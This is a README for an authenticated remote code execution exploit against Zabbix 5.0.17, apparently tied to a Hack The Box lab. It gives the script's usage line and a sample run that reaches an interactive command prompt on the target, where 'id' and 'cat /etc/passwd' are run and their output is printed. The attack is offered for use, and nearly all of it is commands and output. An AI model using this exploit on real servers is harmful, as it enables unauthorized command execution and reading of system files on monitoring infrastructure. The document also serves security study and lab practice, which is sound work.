# Zabbix 5.0.17 -  Remote Code Execution (Authenticated) 
Zabbix is an open-source software tool to monitor IT infrastructure such as networks, servers, virtual machines, and cloud services. Zabbix collects and displays basic metrics. 

## Exploit Infos:
Finder: [Hussien Misbah](https://github.com/HussienMisbah) <br>
Date: 09.03.2022 <br>
Affected Version: 5.0.17 <br>
Build Time: 18.10.2021 <br>
Risk: High <br>

### About exploit :
- This exploit is tested against Zabbix 5.0.17 only
- The account used is the Administrator account 

---

# Proof of Concept 
If you have problems with the exploit script, try the [Step by Step PoC](https://github.com/InfoSec-Crow/HackingStuff/blob/main/Exploits/Python/Zabbix_5.0.17/StepByStep.md).
```
$ ./exploit.py
Usage: ./expoit.py <target url> <username> <password>
Example: ./exploit.py http://example.com Administrator Password123

$ ./exploit.py http://127.0.0.1 Administrator SavePassword321
[*] Get hostId: 10084
[*] Get sid: 425f48afe7a6c98f
[*] Edit item successfully
cmd> id
uid=110(zabbix) gid=118(zabbix) groups=118(zabbix)

cmd> cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
<SNIP>
Debian-snmp:x:111:119::/var/lib/snmp:/bin/false
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false

cmd> exit
Bye

```

---

### Links:
Hussien Misbah:
* https://github.com/HussienMisbah/tools/tree/master/Zabbix_exploit
* https://www.exploit-db.com/exploits/50816

Hack The Box:
* https://app.hackthebox.com/machines/Shibboleth
* https://0xdf.gitlab.io/2022/04/02/htb-shibboleth.html
